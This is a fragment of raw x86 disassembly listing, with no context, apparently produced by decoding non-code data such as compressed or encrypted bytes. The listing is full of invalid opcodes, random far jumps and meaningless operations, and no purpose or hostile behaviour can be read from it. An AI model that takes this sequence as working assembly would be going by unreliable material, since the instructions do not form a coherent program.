  422722:	xlat   BYTE PTR ds:[ebx]
  422723:	mov    ch,0x64
  422725:	enter  0xb299,0x2
  422729:	mov    esi,0x69669b87
  42272e:	xchg   ebp,eax
  42272f:	aas    
  422730:	rcl    BYTE PTR [ebx-0x52],1
  422733:	ret    0x108
  422736:	lock inc ebx
  422738:	dec    edx
  422739:	es xchg esi,eax
  42273b:	sbb    DWORD PTR [ebx],esi
  42273d:	sti    
  42273e:	cmp    BYTE PTR ds:0xcbaea684,bh
  422744:	into   
  422745:	pusha  
  422746:	mov    al,0x6b
  422748:	xor    BYTE PTR [esi-0x7],ch
  42274b:	xchg   esi,eax
  42274c:	jb     0x42277f
  42274e:	cmc    
  42274f:	and    al,BYTE PTR [edi-0x673e8c5c]
  422755:	xor    al,0xe6
  422757:	repnz and ah,ah
  42275a:	mov    eax,ds:0x9e6abc76
  42275f:	ins    BYTE PTR es:[edi],dx
  422760:	cwde   
  422761:	das    
  422762:	sar    dl,1
  422764:	ins    BYTE PTR es:[edi],dx
  422765:	hlt    
  422766:	add    cl,dh
  422768:	push   eax
  422769:	fisttp WORD PTR [edx]
  42276b:	jmp    0x1925:0x8f9d9c50
  422772:	idiv   BYTE PTR [eax-0x21]
  422775:	dec    ecx
  422776:	mov    bh,BYTE PTR [esi+0xa038651]
  42277c:	stc    
  42277d:	mov    BYTE PTR [eax],cl
  42277f:	mov    esp,0xa12524f5
  422784:	outs   dx,DWORD PTR ds:[esi]
  422785:	jge    0x422785
  422787:	mov    esi,0xc96bed1f
  42278c:	dec    edi
  42278d:	mov    cl,ah
  42278f:	mov    ebp,0xf21f86a
  422794:	clc    
  422795:	jo     0x4227ee
  422797:	jp     0x422721
  422799:	enter  0xf4b1,0x5f
  42279d:	lods   eax,DWORD PTR ds:[esi]
  42279e:	js     0x422727
  4227a0:	ds out 0x4e,eax
  4227a3:	aas    
  4227a4:	push   ebx
  4227a5:	rol    DWORD PTR [esi],cl
  4227a7:	idiv   BYTE PTR [eax]
  4227a9:	adc    al,0x52
  4227ab:	jb     0x422784
  4227ad:	loopne 0x422731
  4227af:	mov    al,0x7d
  4227b1:	push   ds
  4227b2:	sbb    eax,0x3cc9573a
  4227b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b8:	frstor [esi+0x434a8a95]
  4227be:	or     eax,DWORD PTR [ecx]
  4227c0:	lds    ebp,FWORD PTR ds:0xa5a4b723
  4227c6:	and    bh,bl
  4227c8:	pop    edx
  4227c9:	outs   dx,BYTE PTR ds:[esi]
  4227ca:	cld    
  4227cb:	mov    bl,0x93
  4227cd:	sub    dh,BYTE PTR [esi-0xf]
  4227d0:	dec    esi
  4227d1:	shl    DWORD PTR [edx+0x377593e6],1
  4227d7:	xchg   edx,eax
  4227d8:	loope  0x422763
  4227da:	and    BYTE PTR [bp-0x3f],ch
  4227de:	out    dx,eax
  4227df:	pop    ecx
  4227e0:	inc    ebp
  4227e1:	fstp   TBYTE PTR [ebx]
  4227e3:	inc    ecx
  4227e4:	mov    cl,0xa9
  4227e6:	shl    ebx,1
  4227e8:	call   0x92bbdeb1
  4227ed:	inc    ebx
  4227ee:	aaa    
	...
  4227f7:	add    BYTE PTR [eax],al
  4227f9:	add    BYTE PTR [eax-0x11],cl
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx-0x67f91df0],ebx
  422808:	xchg   edi,eax
  422809:	mov    esi,0x1a2d8
  42280e:	std    
  42280f:	add    DWORD PTR [eax],eax
  422811:	add    cl,bl
  422813:	jp     0x422813
  422815:	rcr    DWORD PTR [ebp+0x4],0xef
  422819:	cld    
  42281a:	sub    edx,DWORD PTR [edi-0x3de8767c]
  422820:	xor    eax,0xbace4901
  422825:	rol    BYTE PTR [edi],1
  422827:	stc    
  422828:	ffree  st(7)
  42282a:	retf   0x795f
  42282d:	sub    ebx,0x76
  422830:	mov    dl,0xfc
  422832:	sbb    DWORD PTR [eax+0x45538ed3],ebp
  422838:	(bad)  
  422839:	outs   dx,BYTE PTR ds:[esi]
  42283a:	mov    eax,ds:0xa8b766d2
  42283f:	scas   eax,DWORD PTR es:[edi]
  422840:	mov    eax,0x77127bb
  422845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422846:	and    BYTE PTR [eax+0x61],cl
  422849:	pop    ecx
  42284a:	mov    ebp,0x5efbb1af
  42284f:	inc    edi
  422850:	imul   BYTE PTR [eax+0x4a807876]
  422856:	pop    esi
  422857:	lods   al,BYTE PTR ds:[esi]
  422858:	in     al,dx
  422859:	adc    esp,DWORD PTR [edi+0x46b891df]
  42285f:	push   edi
  422860:	retf   0x5708
  422863:	pop    esp
  422864:	mov    ch,0x80
  422866:	mov    bh,0xc5
  422868:	push   ebx
  422869:	mov    ebp,esi
  42286b:	cmp    BYTE PTR [esi+0x33b2b49a],cl
  422871:	mov    ebp,0x9fe319bd
  422876:	xor    DWORD PTR [edi-0x31a5a7b0],ebx
  42287c:	(bad)  
  42287d:	in     al,dx
  42287e:	fcom   QWORD PTR [ecx+eax*2+0x362b8820]
  422885:	outs   dx,BYTE PTR ds:[esi]
  422886:	mov    dh,0x0
  422888:	int    0xd4
  42288a:	mov    edx,0xac2420c4
  42288f:	das    
  422890:	and    BYTE PTR [eax+0x3f],0xbb
  422894:	int    0xa1
  422896:	jns    0x4228b1
  422898:	and    ebx,DWORD PTR [esi+0x53c15d08]
  42289e:	xchg   ecx,eax
  42289f:	stos   DWORD PTR es:[edi],eax
  4228a0:	call   0x1e00:0x77104d9d
  4228a7:	je     0x422906
  4228a9:	hlt    
  4228aa:	or     esi,DWORD PTR [ecx+ebp*1]
  4228ad:	adc    dl,BYTE PTR [eax]
  4228af:	rcr    BYTE PTR [esi],0xc6
  4228b2:	inc    esi
  4228b3:	mov    bh,0xc1
  4228b5:	mov    edx,0x7706a70d
  4228ba:	lock rcr BYTE PTR [ecx],0x9e
  4228be:	(bad)  
  4228bf:	jmp    0x4751:0xfa343273
  4228c6:	sbb    eax,0x30d96300
  4228cb:	cli    
  4228cc:	sbb    DWORD PTR [esi],eax
  4228ce:	aam    0x61
  4228d0:	jno    0x422940
  4228d2:	cmp    al,0x54
  4228d4:	cld    
  4228d5:	test   eax,0xfc56e224
  4228da:	xchg   ebx,eax
  4228db:	push   ebx
  4228dc:	add    ebx,DWORD PTR [ecx]
  4228de:	mov    ebp,0x1e701ee8
  4228e3:	in     al,dx
  4228e4:	mov    ah,0x5a
  4228e6:	neg    DWORD PTR [ecx+edx*2-0x26]
  4228ea:	adc    eax,0x25a8990d
  4228ef:	mov    ?,ebx
  4228f1:	pop    eax
  4228f2:	xor    DWORD PTR [esi-0x320e200b],ebp
  4228f8:	sbb    ebx,ebp
  4228fa:	push   esi
  4228fb:	mov    ah,0x44
  4228fd:	pop    edx
  4228fe:	jae    0x422954
  422900:	jmp    0x436666f3
  422905:	sti    
  422906:	dec    dl
  422908:	in     eax,dx
  422909:	arpl   WORD PTR es:[ebx+0x10],bp
  42290d:	retf   
  42290e:	ror    BYTE PTR [edx+0x2e],cl
  422911:	pop    ecx
  422912:	add    BYTE PTR [edi-0x439de13c],dh
  422918:	or     sp,0x2e
  42291c:	cmp    esp,DWORD PTR [eax+eiz*1+0x67]
  422920:	sbb    ebp,esp
  422922:	adc    DWORD PTR [ebx-0x50],ebx
  422925:	mov    BYTE PTR [ebx-0x36],cl
  422928:	and    al,0x4b
  42292a:	repnz mov bl,0x63
  42292d:	fcmovne st,st(5)
  42292f:	in     al,dx
  422930:	push   ss
  422931:	sbb    eax,0xede8f92d
  422936:	and    ah,BYTE PTR [ebp+0x39]
  422939:	addr16 pop ebp
  42293b:	(bad)  
  42293c:	pop    esi
  42293d:	cmc    
  42293e:	dec    ecx
  42293f:	ror    BYTE PTR [esi+esi*4+0x36c8c240],0x56
  422947:	mov    cl,0x0
  422949:	mov    bh,0xb0
  42294b:	ror    BYTE PTR [ebx-0x57],cl
  42294e:	inc    edx
  42294f:	mov    bl,0xfb
  422951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422952:	into   
  422953:	(bad)  
  422954:	inc    ecx
  422955:	add    DWORD PTR [esi-0x12],edx
  422958:	mov    al,ds:0xfc2a0c07
  42295d:	inc    ebx
  42295e:	jns    0x4229b3
  422960:	mov    ds:0xd4ef0273,al
  422965:	xor    DWORD PTR [edi],eax
  422967:	push   0xfd4019a7
  42296c:	or     dl,BYTE PTR [edx+0x48b31f36]
  422972:	mov    eax,0xb24910c1
  422977:	cmp    bh,BYTE PTR [ebx+eax*2-0x52fb52f7]
  42297e:	jno    0x42293c
  422980:	jg     0x422994
  422982:	cmp    ebp,DWORD PTR [esp+edi*4-0x36f60292]
  422989:	mov    ch,0xc
  42298b:	mov    eax,ds:0x94b4fe76
  422990:	out    0x31,al
  422992:	cli    
  422993:	lahf   
  422994:	or     eax,DWORD PTR [eax]
  422996:	xchg   ebx,eax
  422997:	mov    dh,0x18
  422999:	dec    ebp
  42299a:	inc    edx
  42299b:	jecxz  0x4229d5
  42299d:	stos   BYTE PTR es:[edi],al
  42299e:	pop    ds
  42299f:	or     edx,esi
  4229a1:	imul   BYTE PTR [eax]
  4229a3:	and    al,ah
  4229a5:	push   0x5afa6068
  4229aa:	push   esi
  4229ab:	les    edx,FWORD PTR [edi+0x7b]
  4229ae:	rcl    DWORD PTR [ebx],0x12
  4229b1:	xchg   esp,eax
  4229b2:	dec    edi
  4229b3:	aaa    
  4229b4:	imul   edi,DWORD PTR ds:0x2927e578,0x78432bda
  4229be:	loop   0x422a3f
  4229c0:	cld    
  4229c1:	scas   eax,DWORD PTR es:[edi]
  4229c2:	int3   
  4229c3:	out    0x98,al
  4229c5:	xchg   ebp,eax
  4229c6:	stos   DWORD PTR es:[edi],eax
  4229c7:	rcr    DWORD PTR [ecx],1
  4229c9:	mov    edi,0xd55eb878
  4229ce:	retf   0xbbad
  4229d1:	test   DWORD PTR [ebp-0x30ce72f7],0xce0cdf49
  4229db:	out    0x4b,al
  4229dd:	jp     0x422a2b
  4229df:	xchg   esp,eax
  4229e0:	js     0x4229a1
  4229e2:	outs   dx,BYTE PTR ds:[esi]
  4229e3:	mov    bl,0xa8
  4229e5:	shr    DWORD PTR [ecx-0x1c],cl
  4229e8:	jle    0x4229ba
  4229ea:	xlat   BYTE PTR ds:[ebx]
  4229eb:	mov    bh,bh
  4229ed:	hlt    
  4229ee:	jge    0x422982
  4229f0:	pusha  
  4229f1:	push   esp
  4229f2:	dec    ebp
  4229f3:	das    
  4229f4:	pop    ecx
  4229f5:	mov    edi,0x7131770b
  4229fa:	dec    esi
  4229fb:	in     eax,dx
  4229fc:	add    esp,DWORD PTR [eax+0x765bc2d0]
  422a02:	leave  
  422a03:	fstp   QWORD PTR [edi-0x53bb7de1]
  422a09:	pop    ss
  422a0a:	data16 loop 0x422a16
  422a0d:	data16 ins BYTE PTR es:[edi],dx
	...
  422a17:	add    BYTE PTR [eax],al
  422a19:	add    BYTE PTR [eax+0x5be35ae3],dh
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	into   
  422a27:	mov    bl,0x2e
  422a29:	dec    edi
  422a2a:	aad    0xa4
  422a2c:	add    DWORD PTR [eax],eax
  422a2e:	std    
  422a2f:	add    DWORD PTR [eax],eax
  422a31:	add    BYTE PTR [eax],dl
  422a33:	cwde   
  422a34:	add    al,bl
  422a36:	push   0xffffffa6
  422a38:	sbb    esi,DWORD PTR [edi+0x77]
  422a3b:	lods   eax,DWORD PTR ds:[esi]
  422a3c:	xchg   BYTE PTR ds:0x2478de3b,ah
  422a42:	mov    ebp,0xd0b068df
  422a47:	in     eax,dx
  422a48:	xor    BYTE PTR [ecx+0x19d43ee4],ah
  422a4e:	jnp    0x422abc
  422a50:	jecxz  0x422a7a
  422a52:	mov    ds:0x6c4d2aa8,eax
  422a57:	outs   dx,BYTE PTR ds:[esi]
  422a58:	std    
  422a59:	popf   
  422a5a:	xchg   ebx,eax
  422a5b:	out    0x48,eax
  422a5d:	adc    dh,ch
  422a5f:	jecxz  0x422a15
  422a61:	test   al,0x28
  422a63:	das    
  422a64:	lea    edx,[ecx]
  422a66:	xlat   BYTE PTR ds:[ebx]
  422a67:	sbb    bl,BYTE PTR [esi+0x48199a9c]
  422a6d:	(bad)
  422a71:	iret   
  422a72:	jae    0x422ac7
  422a74:	pop    esi
  422a75:	jge    0x422a88
  422a77:	xor    BYTE PTR [ecx+0x257e491b],0x4a
  422a7e:	sbb    ecx,ecx
  422a80:	f2xm1  
  422a82:	or     DWORD PTR [edx+0x22ede34c],ebp
  422a88:	inc    edx
  422a89:	dec    ecx
  422a8a:	sbb    ch,bh
  422a8c:	stc    
  422a8d:	jmp    0xeed:0xa43bbd87
  422a94:	std    
  422a95:	xor    ecx,DWORD PTR ds:0x826739dc
  422a9b:	lds    edi,FWORD PTR [esi-0x65]
  422a9e:	push   cs
  422a9f:	adc    al,0xd1
  422aa1:	loope  0x422ac0
  422aa3:	cdq    
  422aa4:	ds or  ecx,0x3d
  422aa8:	pop    ebp
  422aa9:	pop    ss
  422aaa:	jmp    0x422b14
  422aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422aad:	fistp  WORD PTR [edi-0x61]
  422ab0:	pop    esi
  422ab1:	pop    esi
  422ab2:	imul   ebp,DWORD PTR [edx],0x7f
  422ab5:	scas   eax,DWORD PTR es:[edi]
  422ab6:	cmp    DWORD PTR [ebx],edi
  422ab8:	jp     0x422a78
  422aba:	cmp    DWORD PTR [ebx+0x569377f4],edx
  422ac0:	push   esi
  422ac1:	(bad)  
  422ac2:	gs xor al,0x42
  422ac5:	pop    ebx
  422ac6:	xor    ah,ch
  422ac8:	sbb    eax,0x693afaf1
  422acd:	xor    DWORD PTR [esi+0x3a],edi
  422ad0:	test   eax,0xb4ffc8d8
  422ad5:	jecxz  0x422ade
  422ad7:	mov    ecx,0x8eecae53
  422adc:	push   0x50
  422ade:	mov    edi,0xd6cb374a
  422ae3:	ja     0x422b62
  422ae5:	popa   
  422ae6:	pop    es
  422ae7:	and    BYTE PTR [eax-0x61],0x24
  422aeb:	cld    
  422aec:	sub    eax,0x409c14ac
  422af1:	sub    al,0x51
  422af3:	mov    ah,0x65
  422af5:	mov    eax,0xe9efc688
  422afa:	mov    ds:0x19487773,al
  422aff:	div    BYTE PTR [eax+0x17]
  422b02:	jae    0x422b3d
  422b04:	mov    al,0xd0
  422b06:	data16 hlt 
  422b08:	xchg   esp,eax
  422b09:	or     ah,ah
  422b0b:	fiadd  WORD PTR [edi+0x2c]
  422b0e:	data16 cld 
  422b10:	xor    ecx,DWORD PTR [esi-0x66]
  422b13:	(bad)  
  422b14:	adc    DWORD PTR [edi-0x3],ebp
  422b17:	or     BYTE PTR [esi-0x13],al
  422b1a:	push   ss
  422b1b:	repz leave 
  422b1d:	mov    BYTE PTR [ebp+0x6a],bl
  422b20:	cmp    BYTE PTR [esi],0x7
  422b23:	popf   
  422b24:	or     eax,esi
  422b26:	jb     0x422b78
  422b28:	adc    al,0x5c
  422b2a:	jbe    0x422b57
  422b2c:	or     eax,0x76484036
  422b31:	pop    ebp
  422b32:	cmp    eax,0x1c8257ef
  422b37:	dec    esi
  422b38:	inc    esp
  422b39:	mov    ebp,0xf2432a37
  422b3e:	xchg   esi,eax
  422b3f:	and    DWORD PTR [eax],0x38
  422b42:	dec    ebx
  422b43:	sbb    bh,BYTE PTR [ecx]
  422b45:	add    esi,DWORD PTR ds:0x52fb5fdd
  422b4b:	(bad)  
  422b4c:	shr    BYTE PTR [esi+ecx*1-0x61],cl
  422b50:	arpl   WORD PTR [edi-0x3c],dx
  422b53:	push   eax
  422b54:	cmp    eax,0x763609ee
  422b59:	and    bl,ah
  422b5b:	popf   
  422b5c:	and    al,0xd5
  422b5e:	push   ds
  422b5f:	push   edx
  422b60:	lea    ecx,[eax]
  422b62:	fmul   QWORD PTR [ebp-0x115fff2c]
  422b68:	dec    esi
  422b69:	push   ebx
  422b6a:	ja     0x422bc8
  422b6c:	das    
  422b6d:	push   esi
  422b6e:	mov    dh,0xf5
  422b70:	push   ss
  422b71:	mov    ecx,0x5b1aec9c
  422b76:	call   0x84acfcd
  422b7b:	lds    ecx,FWORD PTR [esi+0x47]
  422b7e:	push   edi
  422b7f:	cdq    
  422b80:	icebp  
  422b81:	and    eax,0xc2b740a0
  422b86:	and    edi,DWORD PTR [ebx]
  422b88:	cld    
  422b89:	int    0x75
  422b8b:	mov    ecx,DWORD PTR [edx+0x360bb3ad]
  422b91:	cmp    al,0x3f
  422b93:	ror    DWORD PTR [ecx],0x62
  422b96:	xor    eax,0xf58cb9f
  422b9b:	xlat   BYTE PTR ds:[ebx]
  422b9c:	popf   
  422b9d:	cmc    
  422b9e:	dec    edi
  422b9f:	loopne 0x422b60
  422ba1:	loopne 0x422bf6
  422ba3:	ss sbb esp,esp
  422ba6:	out    0x43,al
  422ba8:	shl    BYTE PTR [ebp+0x2a50a832],1
  422bae:	mov    bh,0xcd
  422bb0:	aad    0x48
  422bb2:	sub    bl,dh
  422bb4:	das    
  422bb5:	or     edi,edx
  422bb7:	xchg   esp,eax
  422bb8:	pop    edi
  422bb9:	sti    
  422bba:	popa   
  422bbb:	jle    0x422b43
  422bbd:	add    ecx,esi
  422bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bc0:	mov    edi,DWORD PTR [esi-0x706d27e0]
  422bc6:	push   ds
  422bc7:	jmp    DWORD PTR [edi-0x4f32285a]
  422bcd:	push   eax
  422bce:	mov    ebp,0x5d3f00f6
  422bd3:	call   0xbc050b8e
  422bd8:	rcl    DWORD PTR [eax+0x6d],0xd8
  422bdc:	call   0xa8e6b269
  422be1:	xlat   BYTE PTR ds:[ebx]
  422be2:	das    
  422be3:	popa   
  422be4:	push   cs
  422be5:	pop    ecx
  422be6:	fstp   QWORD PTR [edi-0x6e]
  422be9:	inc    eax
  422bea:	mov    esi,0x37c7de51
  422bef:	xor    DWORD PTR [ebp-0x59],edi
  422bf2:	jmp    0x56996cdc
  422bf7:	es aam 0x8
  422bfa:	and    edx,DWORD PTR [ecx+0x2a3442c3]
  422c00:	adc    eax,0x85711a2
  422c05:	pop    esp
  422c06:	and    eax,0xf0fec28a
  422c0b:	sahf   
  422c0c:	jge    0x422c79
  422c0e:	jecxz  0x422c8d
  422c10:	and    al,0xd3
  422c12:	push   esi
  422c13:	leave  
  422c14:	inc    edi
  422c15:	int3   
  422c16:	jno    0x422be5
  422c18:	aaa    
  422c19:	inc    esi
  422c1a:	nop
  422c1b:	fisub  WORD PTR [ebx-0x2e]
  422c1e:	inc    eax
  422c1f:	inc    esp
  422c20:	cli    
  422c21:	sbb    eax,0x81db1411
  422c26:	xchg   edi,eax
  422c27:	add    al,0xc7
  422c29:	jns    0x422c96
  422c2b:	xchg   esp,eax
  422c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c2d:	inc    esi
  422c2e:	and    BYTE PTR [eax],al
	...
  422c38:	add    BYTE PTR [eax],al
  422c3a:	xor    eax,0xbf06168e
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    esp,ecx
  422c47:	add    al,0x95
  422c49:	psrld  mm4,QWORD PTR [esi+0x1fd0001]
  422c50:	add    BYTE PTR [eax],al
  422c52:	or     BYTE PTR [esi+0x18],al
  422c55:	inc    eax
  422c56:	and    eax,0x1a84c6c9
  422c5b:	rcl    DWORD PTR [edi],0x9f
  422c5e:	dec    ebp
  422c5f:	add    BYTE PTR [edx-0x2d],ch
  422c62:	fild   DWORD PTR [ecx+0x7592a5ee]
  422c68:	push   cs
  422c69:	inc    edi
  422c6a:	or     DWORD PTR [eax-0x61],edi
  422c6d:	mov    bl,0x3
  422c6f:	aad    0x25
  422c71:	(bad)  
  422c72:	mov    ch,0xde
  422c74:	fisub  WORD PTR [ecx-0x632082e8]
  422c7a:	aaa    
  422c7b:	mov    bl,0x61
  422c7d:	mov    dl,0xf1
  422c7f:	push   0x431caf47
  422c84:	push   esi
  422c85:	pop    es
  422c86:	dec    ebp
  422c87:	fwait
  422c88:	loopne 0x422c0b
  422c8a:	jno    0x422c49
  422c8c:	inc    eax
  422c8d:	rcr    DWORD PTR [ebx],0x82
  422c90:	push   0x56
  422c92:	mov    al,ds:0x581004c6
  422c97:	adc    ebx,ebx
  422c99:	add    DWORD PTR [ebp+0x4225587a],eax
  422c9f:	into   
  422ca0:	dec    ebp
  422ca1:	sbb    DWORD PTR [eax],0x14
  422ca4:	mov    bl,0x7a
  422ca6:	call   0xf14b:0x33496319
  422cad:	bound  esi,QWORD PTR [eax]
  422caf:	retf   
  422cb0:	cmp    eax,0xec0b43e1
  422cb5:	jbe    0x422cd8
  422cb7:	jbe    0x422c73
  422cb9:	pushf  
  422cba:	add    eax,0x5bb0a679
  422cbf:	pop    ss
  422cc0:	ror    BYTE PTR [edx],1
  422cc2:	jno    0x422c59
  422cc4:	adc    ah,cl
  422cc6:	jns    0x422d40
  422cc8:	push   es
  422cc9:	in     al,0xef
  422ccb:	mov    ds:0xa2290b1c,eax
  422cd0:	enter  0x75ef,0x1a
  422cd4:	or     esp,DWORD PTR [eax]
  422cd6:	rol    ch,cl
  422cd8:	add    al,0xa9
  422cda:	adc    cl,ah
  422cdc:	in     al,dx
  422cdd:	fsubr  DWORD PTR [ebp+edi*4+0x5032b872]
  422ce4:	popa   
  422ce5:	mov    BYTE PTR [esi+eax*1],dl
  422ce8:	xchg   esi,eax
  422ce9:	ds bnd je 0x422c9e
  422ced:	xor    BYTE PTR [esi-0x200b814d],cl
  422cf3:	mov    eax,ds:0xe5e0fff5
  422cf8:	add    dh,BYTE PTR [ecx-0x5224bc0b]
  422cfe:	sar    DWORD PTR [ebp-0x53],0x97
  422d02:	scas   al,BYTE PTR es:[edi]
  422d03:	dec    ecx
  422d04:	xchg   edi,eax
  422d05:	in     eax,dx
  422d06:	xlat   BYTE PTR cs:[ebx]
  422d08:	das    
  422d09:	imul   edx,DWORD PTR [ebx-0x2be0788a],0xd1295f34
  422d13:	(bad)  
  422d14:	sahf   
  422d15:	sub    DWORD PTR [esi-0xf],esi
  422d18:	cmp    DWORD PTR ds:0x7f6e934d,ebp
  422d1e:	jbe    0x422cd8
  422d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d21:	frstor [edi]
  422d23:	pop    ss
  422d24:	xchg   edi,eax
  422d25:	lock les eax,FWORD PTR [ecx-0x629df2a0]
  422d2c:	add    esp,DWORD PTR [edx+0x6c]
  422d2f:	sahf   
  422d30:	stc    
  422d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d32:	push   ebx
  422d33:	inc    ebx
  422d34:	mov    ah,0x70
  422d36:	sub    al,0x4c
  422d38:	imul   DWORD PTR ds:0x6a39c692
  422d3e:	jae    0x422cda
  422d40:	mov    dl,BYTE PTR [ecx]
  422d42:	dec    ecx
  422d43:	test   al,0x7f
  422d45:	add    ecx,ebp
  422d47:	mov    eax,ds:0x2481f835
  422d4d:	pop    ds
  422d4e:	ficomp WORD PTR [eax-0x3d]
  422d51:	(bad)  
  422d52:	push   esi
  422d53:	(bad)  
  422d54:	sbb    eax,0x58cd3de
  422d59:	xor    BYTE PTR [eax-0x6],cl
  422d5c:	fist   WORD PTR [edi-0x47b5c080]
  422d62:	daa    
  422d63:	icebp  
  422d64:	push   ebx
  422d65:	mov    ebp,0xa15ed2f2
  422d6a:	inc    esp
  422d6b:	test   DWORD PTR [ebx+0x3],edx
  422d6e:	push   edx
  422d6f:	jbe    0x422d25
  422d71:	loopne 0x422dd4
  422d73:	jns    0x422d36
  422d75:	and    ecx,DWORD PTR [ebx+0x564a25c]
  422d7b:	xchg   edi,eax
  422d7c:	and    al,0x21
  422d7e:	outs   dx,DWORD PTR ds:[esi]
  422d7f:	iret   
  422d80:	sub    al,0xdc
  422d82:	pop    ebp
  422d83:	outs   dx,BYTE PTR ds:[esi]
  422d84:	inc    ebx
  422d85:	adc    eax,DWORD PTR [edi-0x71]
  422d88:	push   ebx
  422d89:	mov    ch,0x18
  422d8b:	inc    esp
  422d8c:	jle    0x422d30
  422d8e:	data16 cmc 
  422d90:	xchg   ecx,eax
  422d91:	inc    ecx
  422d92:	mov    edx,0x7774b4b
  422d97:	pusha  
  422d98:	daa    
  422d99:	retf   0x6a7a
  422d9c:	in     al,dx
  422d9d:	leave  
  422d9e:	int    0xee
  422da0:	out    dx,al
  422da1:	clc    
  422da2:	push   esi
  422da3:	adc    esp,DWORD PTR [esi-0x50]
  422da6:	je     0x422df5
  422da8:	mov    eax,ds:0xe4e46f38
  422dad:	aad    0x74
  422daf:	out    dx,eax
  422db0:	sbb    al,0x81
  422db2:	mov    fs,WORD PTR ds:0xa04cf060
  422db8:	popa   
  422db9:	pop    ebx
  422dba:	jmp    DWORD PTR [ebp-0xcac1a1e]
  422dc0:	mov    ch,0xf6
  422dc2:	(bad)  
  422dc4:	cmp    al,0xe2
  422dc6:	jp     0x422d49
  422dc8:	mov    DWORD PTR [esi],ecx
  422dca:	adc    eax,DWORD PTR [ebx-0x4b]
  422dcd:	pop    ebp
  422dce:	adc    bh,BYTE PTR ds:0x9f068550
  422dd4:	fisub  WORD PTR [ebx+ebp*4+0x5b]
  422dd8:	xor    DWORD PTR [eax-0x1a3b3df4],eax
  422dde:	std    
  422ddf:	fistp  DWORD PTR [ebp+0x7]
  422de2:	les    esi,FWORD PTR [edi+0x6a77e9a6]
  422de8:	inc    esi
  422de9:	out    dx,eax
  422dea:	aad    0xfd
  422dec:	das    
  422ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dee:	sbb    eax,0xb23f299c
  422df3:	pop    ecx
  422df4:	ins    BYTE PTR es:[edi],dx
  422df5:	push   ds
  422df6:	test   BYTE PTR [eax-0x7],cl
  422df9:	push   ebp
  422dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dfb:	cmp    al,0x81
  422dfd:	loop   0x422db7
  422dff:	jmp    0x5ca40040
  422e04:	or     DWORD PTR [ecx-0x6766166e],esi
  422e0a:	push   0xffffffd5
  422e0c:	mov    al,gs:0x6613172e
  422e12:	or     al,0xb7
  422e14:	mov    esp,DWORD PTR [ecx+0x37ca15a7]
  422e1a:	sub    al,BYTE PTR [esi]
  422e1c:	cwde   
  422e1d:	loopne 0x422e6c
  422e1f:	scas   eax,DWORD PTR es:[edi]
  422e20:	aas    
  422e21:	mov    esi,DWORD PTR [ecx-0x314e0e4d]
  422e27:	xor    eax,0x1c78fdd6
  422e2c:	jg     0x422e8e
  422e2e:	jmp    0x422e15
  422e30:	mov    esp,0x402ec1f3
  422e35:	sti    
  422e36:	rcr    BYTE PTR [edx-0x63],cl
  422e39:	sub    esi,DWORD PTR [esi-0x3]
  422e3c:	imul   ebx,DWORD PTR ds:0x7f2983e2,0xffffffe6
  422e43:	inc    esi
  422e44:	inc    ebp
  422e45:	fucompp 
  422e47:	test   BYTE PTR [edx-0x38cb4ba8],dl
  422e4d:	cmp    al,0x90
	...
  422e57:	add    BYTE PTR [eax],al
  422e59:	add    cl,bh
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi+0x6381fec4]
  422e68:	shl    ah,1
  422e6a:	iret   
  422e6b:	test   al,0x1
  422e6d:	add    ch,bh
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    BYTE PTR [ebp-0x21],ah
  422e74:	mov    ecx,0xc4d7af45
  422e79:	or     BYTE PTR gs:0xb8fecc0c,ah
  422e80:	add    BYTE PTR [esi],bh
  422e82:	retf   0xc2d6
  422e85:	popa   
  422e86:	mov    bl,0xf1
  422e88:	je     0x422ea8
  422e8a:	out    dx,eax
  422e8b:	cmp    al,0xba
  422e8d:	jle    0x422ee3
  422e8f:	add    al,0x1e
  422e91:	mov    WORD PTR [esi+0x21],gs
  422e94:	clc    
  422e95:	mov    edi,0xd6159cce
  422e9a:	in     al,dx
  422e9b:	jmp    0x10da:0xfe8e4018
  422ea2:	jb     0x422eda
  422ea4:	pop    esi
  422ea5:	mov    WORD PTR [edx],cs
  422ea7:	or     al,0xf3
  422ea9:	inc    ecx
  422eaa:	adc    eax,0x2d66f9a4
  422eaf:	and    BYTE PTR [ecx-0x61],ch
  422eb2:	into   
  422eb3:	xor    al,0x43
  422eb5:	mov    BYTE PTR [edi+0x1a5952e0],0x4b
  422ebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ebd:	js     0x422f3d
  422ebf:	and    DWORD PTR [ebx+0x67],ebx
  422ec2:	out    dx,eax
  422ec3:	int    0xb7
  422ec5:	sbb    DWORD PTR [edx],eax
  422ec7:	inc    ebx
  422ec8:	faddp  st(7),st
  422eca:	cmp    bl,BYTE PTR [ecx+0x2e]
  422ecd:	and    al,0x50
  422ecf:	xor    ebx,DWORD PTR [edi+eiz*2]
  422ed2:	aas    
  422ed3:	sub    esp,ecx
  422ed5:	adc    esi,DWORD PTR [eax-0x470cc767]
  422edb:	call   FWORD PTR [edx-0x7aee9b4b]
  422ee1:	add    BYTE PTR [ecx],cl
  422ee3:	mov    ecx,0x7c358d1c
  422ee8:	sti    
  422ee9:	popf   
  422eea:	xor    edi,DWORD PTR [edx-0xaeee659]
  422ef0:	sbb    DWORD PTR [ecx+eax*4],esi
  422ef3:	xor    al,0x8b
  422ef5:	scas   al,BYTE PTR es:[edi]
  422ef6:	xchg   ebp,eax
  422ef7:	(bad)
